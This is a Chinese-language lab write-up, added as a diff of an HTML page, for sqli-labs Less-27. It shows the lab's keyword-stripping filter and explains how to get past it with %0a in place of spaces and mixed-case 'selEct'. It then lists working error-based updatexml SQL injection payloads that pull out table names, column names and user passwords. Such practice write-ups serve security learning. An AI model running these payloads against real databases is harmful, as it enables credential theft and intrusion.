@@ -1,0 +1,41 @@
+<hr>
+<h2 id="title-less27url-https-www-yuque-com-u29002979-ep2zrx-ou09sqdkpugeowuf"><a href="#title-less27url-https-www-yuque-com-u29002979-ep2zrx-ou09sqdkpugeowuf" class="headerlink" title="title: less27url: https://www.yuque.com/u29002979/ep2zrx/ou09sqdkpugeowuf"></a>title: less27<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/ou09sqdkpugeowuf">https://www.yuque.com/u29002979/ep2zrx/ou09sqdkpugeowuf</a></h2><pre><code class="bash">$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+
+$id= preg_replace(&#39;/[\/*]/&#39;,&quot;&quot;, $id);		//strip out /*
+$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);		//Strip out --.
+$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);			//Strip out #.
+$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);	    //Strip out spaces.
+
+$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);	    //Strip out spaces.
+$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);	    //Strip out spaces.
+$id= preg_replace(&#39;/union/s&#39;,&quot;&quot;, $id);	    //Strip out union
+$id= preg_replace(&#39;/select/s&#39;,&quot;&quot;, $id);	    //Strip out select
+$id= preg_replace(&#39;/UNION/s&#39;,&quot;&quot;, $id);	    //Strip out UNION
+$id= preg_replace(&#39;/SELECT/s&#39;,&quot;&quot;, $id);	    //Strip out SELECT
+$id= preg_replace(&#39;/Union/s&#39;,&quot;&quot;, $id);	    //Strip out Union
+$id= preg_replace(&#39;/Select/s&#39;,&quot;&quot;, $id);	    //Strip out select
+</code></pre>
+<p>新增加<strong>union,select,UNION,SELECT,Union,Select</strong>被过滤。</p>
+<blockquote>
+<p>空格，换行——&gt; %0a</p>
+</blockquote>
+<p>and，or没有被过滤。<br>针对php这种弱类型语言，可以采用<strong>部分大写部分小写绕过</strong> <strong>selEct</strong></p>
+<blockquote>
+<p>All Your UNTON and SELEBCT belong to US.</p>
+</blockquote>
+<p><strong>union和select</strong>也被过滤了。 <a name="F1rLT"></a></p>
+<h1 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h1><p><code>1&#39;</code></p>
+<blockquote>
+<p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-27\index.php</strong> on line <strong>36</strong><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>用单引号闭合**’**</p>
+<p><a name="l8hNe"></a></p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre><code class="bash">爆破数据库名称
+1&#39;and%0aupdatexml(1,concat(0x7e,database(),0x7e),1)or&#39;
+爆破数据表名称
+1&#39;and%0aupdatexml(1,concat(0x7e,(selEct%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()),0x7e),1)or&#39;1
+爆破字段名
+1&#39;and%0aupdatexml(1,concat(0x7e,(selEct%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema=database()%0aand%0atable_name=&#39;users&#39;),0x7e),1)or&#39;1
+爆破字段内容
+1&#39;and%0aupdatexml(1,concat(0x7e,(selEct(group_concat(username,0x7e,password))from%0ausers),0x7e),1)||&#39;
+</code></pre>
